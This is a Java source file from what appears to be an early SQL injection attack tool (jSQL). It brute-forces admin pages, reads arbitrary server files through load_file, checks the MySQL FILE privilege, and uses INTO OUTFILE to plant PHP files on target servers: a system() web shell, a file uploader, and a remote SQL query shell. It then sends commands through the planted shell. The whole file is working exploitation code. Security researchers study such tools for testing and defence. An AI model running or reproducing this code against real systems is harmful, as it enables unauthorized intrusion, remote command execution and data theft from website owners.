/*******************************************************************************
 * Copyhacked (H) 2012-2013.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.ao;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.nio.charset.CharsetEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.Callable;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.bean.Request;
import com.jsql.tool.StringTool;
import com.jsql.view.dnd.list.ListItem;

/**
 * Ressource access object.
 * Get informations from file system, commands, webpage.
 */
public class RessourceAccessObject {
    private InjectionModel model;
    
    public final String WEBSHELL_FILENAME = "j" + InjectionModel.jSQLVersion + ".tmp1.php";
    public final String UPLOAD_FILENAME = "j" + InjectionModel.jSQLVersion + ".tmp2.php";
    public final String SQLSHELL_FILENAME = "j" + InjectionModel.jSQLVersion + ".tmp3.php";
    
    public RessourceAccessObject(InjectionModel model){
        this.model = model;
    }
    
    /**
     * Callable for parallelized HTTP tasks
     * url: SQL query
     * content: source code of the web page
     * tag: store user information (ex. current index)
     */
    public class AdminPageCallable implements Callable<AdminPageCallable>{
        public String url, content;
        AdminPageCallable(String url){
            this.url = url;
        }

        @Override
        public AdminPageCallable call() throws Exception {
            if(!RessourceAccessObject.this.endAdminSearch){
                URL targetUrl = new URL( url );
                HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();
                conn.setRequestMethod("HEAD");
                content = conn.getHeaderField(0);

                String logs = "\n"+url+"\n";
                for (int i=0; ;i++) {
                    String headerName = conn.getHeaderFieldKey(i);
                    String headerValue = conn.getHeaderField(i);
                    if (headerName == null && headerValue == null) break;

                    logs += (headerName==null?"":headerName+": ")+headerValue+"\n";
                }
                
                conn.disconnect();

                Request request = new Request();
                request.setMessage("MessageHeader");
                request.setParameters(logs);
                model.interact(request);
            }
            return this;
        }
    }
    
    public boolean endAdminSearch = false;
    
    public void getAdminPage(String string, List<ListItem> list) {
        String fin = string.replaceAll("^https?://[^/]*", "");
        String debut = string.replace(fin, "");
        String chemin = fin.replaceAll("[^/]*$", "");
        ArrayList<String> cheminArray = new ArrayList<String>();
        if(chemin.split("/").length == 0)
            cheminArray.add("/");
        for(String s: chemin.split("/"))
            cheminArray.add(s+"/");

        int nb = 0;
        String progressURL = "";
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<AdminPageCallable> taskCompletionService = new ExecutorCompletionService<AdminPageCallable>(taskExecutor);
        for(String segment: cheminArray){
            progressURL += segment;

            for(ListItem s: list)
                taskCompletionService.submit(new AdminPageCallable(debut + progressURL + s.toString()));
        }

        int submittedTasks = cheminArray.size() * list.size();
        for(int tasksHandled=0; tasksHandled<submittedTasks && !this.endAdminSearch ;tasksHandled++){
            try {
                AdminPageCallable currentCallable = taskCompletionService.take().get();
                if(currentCallable.content != null && currentCallable.content.indexOf("200 OK") >= 0){
                    Request request = new Request();
                    request.setMessage("CreateAdminPageTab");
                    request.setParameters(currentCallable.url);
                    model.interact(request);

                    nb++;
                }
            } catch (InterruptedException e) {
                this.model.sendDebugMessage(e);
                model.sendErrorMessage("Current thread was interrupted while waiting.");
            } catch (ExecutionException e) {
                this.model.sendDebugMessage(e);
                model.sendErrorMessage("Computation threw an exception.");
            }
        }

        taskExecutor.shutdown();
        try {
            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            this.model.sendDebugMessage(e);
        }

        this.endAdminSearch = false;

        model.sendMessage("Admin page(s) found: "+nb+"/"+submittedTasks);

        Request request = new Request();
        request.setMessage("EndAdminSearch");
        model.interact(request);
    }
    
    public void getShell(String path, String url) throws PreparationException, StoppableException {
        if(!this.checkFilePrivilege()) return;

        model.inject(
                model.initialQuery.replaceAll("1337"+model.visibleIndex+"7331","(select+0x"+StringTool.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>")+")").replaceAll("--++","")+
                "+into+outfile+\""+path+WEBSHELL_FILENAME+"\"--+"
                );

        String[] sourcePage = {""};
        String hexResult = model.new Stoppable_loopIntoResults(model).action(
                "concat(hex(load_file(0x"+StringTool.strhex(path+WEBSHELL_FILENAME)+")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if(hexResult.equals("")){
            model.sendResponseFromSite( "Can't find web shell at "+path+WEBSHELL_FILENAME, sourcePage[0].trim() );
            return;
        }

        if(url.equals("")){
            url = model.initialUrl.substring( 0, model.initialUrl.lastIndexOf('/')+1 );
        }

        ArrayList<String> f = new ArrayList<String>();
        f.add(path.substring( path.lastIndexOf('/'), path.length() ));
        if(StringTool.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1){
            Request request = new Request();
            request.setMessage("CreateShellTab");
            request.setParameters(path, url);
            model.interact(request);
        }else{
            model.sendErrorMessage("Web shell not usable.");
        }
    }
    
    public void upload(String path, String url, File file) throws PreparationException, StoppableException {
        if(!this.checkFilePrivilege()) return;

        model.inject(
                model.initialQuery.replaceAll("1337"+model.visibleIndex+"7331","(select+0x"+StringTool.strhex("<SQLi>" +
                		"<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>" +
                		"<iLQS>")+")").replaceAll("--++","")+
                "+into+outfile+\""+path+UPLOAD_FILENAME+"\"--+"
                );

        String[] sourcePage = {""};
        String hexResult = model.new Stoppable_loopIntoResults(model).action(
                "concat(hex(load_file(0x"+StringTool.strhex(path+UPLOAD_FILENAME)+")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if(hexResult.equals("")){
            model.sendResponseFromSite( "Can't find upload file at "+path+UPLOAD_FILENAME, sourcePage[0].trim() );
            return;
        }

        if(url.equals("")){
            url = model.initialUrl.substring( 0, model.initialUrl.lastIndexOf('/')+1 );
        }

        ArrayList<String> f = new ArrayList<String>();
        f.add(path.substring( path.lastIndexOf('/'), path.length() ));
        if(StringTool.hexstr(hexResult).indexOf("<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>") > -1){
            
            String CrLf = "\r\n";
            URLConnection conn = null;
            OutputStream os = null;
            InputStream is = null;

            try {
                URL url2 = new URL(url+"/"+UPLOAD_FILENAME);
                conn = url2.openConnection();
                conn.setDoOutput(true);

                InputStream imgIs = new FileInputStream(file);
                byte[] imgData = new byte[imgIs.available()];
                imgIs.read(imgData);
                
                String message1 = "";
                message1 += "-----------------------------4664151417711" + CrLf;
                message1 += "Content-Disposition: form-data; name=\"u\"; filename=\""+file.getName()+"\"" + CrLf;
                message1 += "Content-Type: binary/octet-stream" + CrLf;
                message1 += CrLf;

                String message2 = "";
                message2 += CrLf + "-----------------------------4664151417711--" + CrLf;

                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
                conn.setRequestProperty("Content-Length", String.valueOf((message1.length() + message2.length() + imgData.length)));

                os = conn.getOutputStream();
                os.write(message1.getBytes());

                int index = 0;
                int size = 1024;
                do {
                    if ((index + size) > imgData.length) {
                        size = imgData.length - index;
                    }
                    os.write(imgData, index, size);
                    index += size;
                } while (index < imgData.length);

                os.write(message2.getBytes());
                os.flush();

                is = conn.getInputStream();

                char buff = 512;
                int len;
                byte[] data = new byte[buff];
                String result = "";
                do {
                    len = is.read(data);

                    if (len > 0) {
                        result += new String(data, 0, len);
                    }
                } while (len > 0);

                if(result.indexOf("SQLiy") > -1)
                    model.sendMessage("Upload successful.");
                else
                    model.sendErrorMessage("Upload failed.");
                
            } catch (Exception e) {
                model.sendDebugMessage(e);
                model.sendErrorMessage("Error encountered during upload.");
            } finally {
                try {
                    os.close();
                } catch (Exception e) {
                    model.sendDebugMessage(e);
                    model.sendErrorMessage("Error encountered when closing connection.");
                }
                try {
                    is.close();
                } catch (Exception e) {
                    model.sendDebugMessage(e);
                    model.sendErrorMessage("Error encountered when closing connection.");
                }
            }
        }else{
            model.sendErrorMessage("Upload not usable.");
        }
        
        Request request = new Request();
        request.setMessage("EndUpload");
        model.interact(request);
    }
    
    public boolean checkFilePrivilege() throws PreparationException, StoppableException{
        String[] sourcePage = {""};

        String hexResult = model.new Stoppable_loopIntoResults(model).action(
                "concat((select+hex(if(count(*)=1,0x"+StringTool.strhex("true")+",0x"+StringTool.strhex("false")+
                "))from+INFORMATION_SCHEMA.USER_PRIVILEGES+where+grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)and+PRIVILEGE_TYPE=0x46494c45),0x69)", 
                sourcePage,
                false,
                1,
                null);

        if(hexResult.equals("")){
            model.sendResponseFromSite( "Can't read privilege", sourcePage[0].trim() );
            Request request = new Request();
            request.setMessage("MarkFileSystemInvulnerable");
            model.interact(request);
            hasFileRight = false;
        }else if(StringTool.hexstr(hexResult).equals("false")){
            model.sendErrorMessage( "No FILE privilege" );
            Request request = new Request();
            request.setMessage("MarkFileSystemInvulnerable");
            model.interact(request);
            hasFileRight = false;
        }else{
            Request request = new Request();
            request.setMessage("MarkFileSystemVulnerable");
            model.interact(request);
            hasFileRight = true;
        }
        
        return hasFileRight;
    }
    
    public boolean hasFileRight = false;
    public boolean endFileSearch = false;
    public void getFile(List<ListItem> list) throws PreparationException, StoppableException{
        if(!checkFilePrivilege()) return;

        int nb = 0;
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<FileCallable> taskCompletionService = new ExecutorCompletionService<FileCallable>(taskExecutor);

        for(ListItem s: list)
            taskCompletionService.submit(new FileCallable(s.toString()));

        ArrayList<String> duplicate = new ArrayList<String>();
        int submittedTasks = list.size();
        for(int tasksHandled=0; tasksHandled<submittedTasks && !endFileSearch ;tasksHandled++){
            try {
                FileCallable currentCallable = taskCompletionService.take().get();
                if(currentCallable.content.equals("")){
                    //                    sendErrorMessage( "Can't read file"+currentCallable.url );
                }else{
                    String name = currentCallable.url.substring( currentCallable.url.lastIndexOf('/')+1, currentCallable.url.length() );
                    String content = StringTool.hexstr(currentCallable.content).replace("\r", "");
                    String path = currentCallable.url;

                    Request request = new Request();
                    request.setMessage("CreateFileTab");
                    request.setParameters(name, content, path);
                    model.interact(request);

                    if(!duplicate.contains(path.replace(name, "")))
                        model.sendMessage("Shell might be possible in folder "+path.replace(name, ""));
                    duplicate.add(path.replace(name, ""));

                    nb++;
                }
            } catch (InterruptedException e) {
                this.model.sendDebugMessage(e);
                model.sendErrorMessage("Current thread was interrupted while waiting.");
            } catch (ExecutionException e) {
                this.model.sendDebugMessage(e);
                model.sendErrorMessage("Computation threw an exception.");
            }
        }

        taskExecutor.shutdown();
        try {
            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            this.model.sendDebugMessage(e);
        }

        endFileSearch = false;

        model.sendMessage("File(s) found: "+nb+"/"+submittedTasks);
        Request request = new Request();
        request.setMessage("EndFileSearch");
        model.interact(request);
    }

    public class FileCallable implements Callable<FileCallable>{
        public String url, content, tag;
        FileCallable(String url){
            this.url = url;
        }

        FileCallable(String url, String tag){
            this(url);
            this.tag = tag;
        }

        @Override
        public FileCallable call() throws Exception {
            if(!endFileSearch){
                String[] sourcePage = {""};

                String hexResult = "";
                try{
                    hexResult = model.new Stoppable_loopIntoResults(model).action(
                            "concat(hex(load_file(0x"+StringTool.strhex(url)+")),0x69)",
                            sourcePage,
                            false,
                            1,
                            null);
                }catch(PreparationException e){
                    // User cancels the search, probably
                }catch(StoppableException e){
                    // User cancels the search, probably
                }
                content = hexResult;
            }
            return this;
        }
    }
    
    /**
     * Run a shell command on host.
     * @param cmd The command to execute
     * @param terminalID An unique identifier for terminal
     * @param wbhPath Web path of the shell
     */
    public void executeShell(String cmd, UUID terminalID, String wbhPath) {
        URLConnection con;
        try {
            con = new URL(wbhPath+WEBSHELL_FILENAME+"?c="+URLEncoder.encode(cmd.trim(), "ISO-8859-1")).openConnection();
            con.setReadTimeout(60000);
            con.setConnectTimeout(60000);

            BufferedReader reader = new BufferedReader(new InputStreamReader( con.getInputStream() ));
            String line, pageSource = "";
            while( (line = reader.readLine()) != null ) pageSource += line+"\n";
            reader.close();

            Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
            regexSearch.find();

            Request request = new Request();
            request.setMessage("GetShellResult");
            request.setParameters(terminalID, regexSearch.group(1), cmd);
            model.interact(request);
        } catch (MalformedURLException e) {
            this.model.sendDebugMessage(e);
        } catch (IOException e) {
            this.model.sendDebugMessage(e);
        }
    }

    public void getSQLShell(String path, String url, String user, String pass) throws PreparationException, StoppableException {
        if(!this.checkFilePrivilege()) return;
        
        String s = "<SQLi><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);" +
"$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<iLQS>');" +
"if(is_resource($result)){" +
    "echo'<SQLr>';" +
    "while($row=mysql_fetch_array($result,MYSQL_NUM))echo'<tr><td>',join('</td><td>',$row),'</td></tr>';" +
"}else if($result==TRUE)echo'<SQLm>Query OK: ',mysql_affected_rows(),' row(s) affected';" +
"else if($result==FALSE)echo'<SQLm>Query failed';" +
                " ?><iLQS>";

        model.inject(
                model.initialQuery.replaceAll("1337"+model.visibleIndex+"7331","(select+0x"+StringTool.strhex(s)+")").replaceAll("--++","")+
                "+into+outfile+\""+path+SQLSHELL_FILENAME+"\"--+"
                );

        String[] sourcePage = {""};
        String hexResult = model.new Stoppable_loopIntoResults(model).action(
                "concat(hex(load_file(0x"+StringTool.strhex(path+SQLSHELL_FILENAME)+")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if(hexResult.equals("")){
            model.sendResponseFromSite( "Can't find SQL shell at "+path+SQLSHELL_FILENAME, sourcePage[0].trim() );
            return;
        }

        if(url.equals("")){
            url = model.initialUrl.substring( 0, model.initialUrl.lastIndexOf('/')+1 );
        }

        ArrayList<String> f = new ArrayList<String>();
        f.add(path.substring( path.lastIndexOf('/'), path.length() ));
        if(StringTool.hexstr(hexResult).indexOf(s) > -1){
            Request request = new Request();
            request.setMessage("CreateSQLShellTab");
            request.setParameters(path, url, user, pass);
            model.interact(request);
        }else{
            model.sendErrorMessage("SQL shell not usable.");
        }
    }

    public void executeSQLShell(String cmd, UUID terminalID, String wbhPath, String user, String pass) {
        URLConnection con;
        try {
            con = new URL(wbhPath+SQLSHELL_FILENAME+"?q="+URLEncoder.encode(cmd.trim(), "ISO-8859-1")+
                    "&u="+user+"&p="+pass).openConnection();
            con.setReadTimeout(60000);
            con.setConnectTimeout(60000);

            BufferedReader reader = new BufferedReader(new InputStreamReader( con.getInputStream() ));
            String line, pageSource = "";
            while( (line = reader.readLine()) != null ) pageSource += line+"\n";
            reader.close();

            Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
            regexSearch.find();

            Request request = new Request();
            request.setMessage("GetSQLShellResult");
            request.setParameters(terminalID, regexSearch.group(1), cmd);
            model.interact(request);
        } catch (MalformedURLException e) {
            this.model.sendDebugMessage(e);
        } catch (IOException e) {
            this.model.sendDebugMessage(e);
        }
    }
}
